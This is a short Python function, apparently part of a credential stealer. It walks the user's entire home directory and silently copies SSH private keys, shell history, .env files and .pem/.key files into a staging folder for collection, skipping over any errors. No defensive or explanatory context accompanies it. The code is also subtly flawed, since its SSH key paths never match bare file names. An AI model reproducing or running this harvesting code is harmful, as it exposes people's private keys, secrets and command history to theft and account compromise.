import os
import shutil

def search_secrets(scan_path):
    targets = ['.ssh/id_rsa', '.ssh/id_ed25519', '.bash_history', '.env']
    found_secrets = []
    home = os.path.expanduser("~")
    
    for root, dirs, files in os.walk(home):
        for file in files:
            full_path = os.path.join(root, file)
            
            if file in targets or file.endswith(('.pem', '.key')):
                try:
                    # Se for o histórico, renomeia para ficar claro na pasta
                    new_name = "bash_history.txt" if file == ".bash_history" else f"key_{file}"
                    dest = os.path.join(scan_path, new_name)
                    
                    shutil.copy2(full_path, dest)
                    found_secrets.append(dest)
                except:
                    continue
    return found_secrets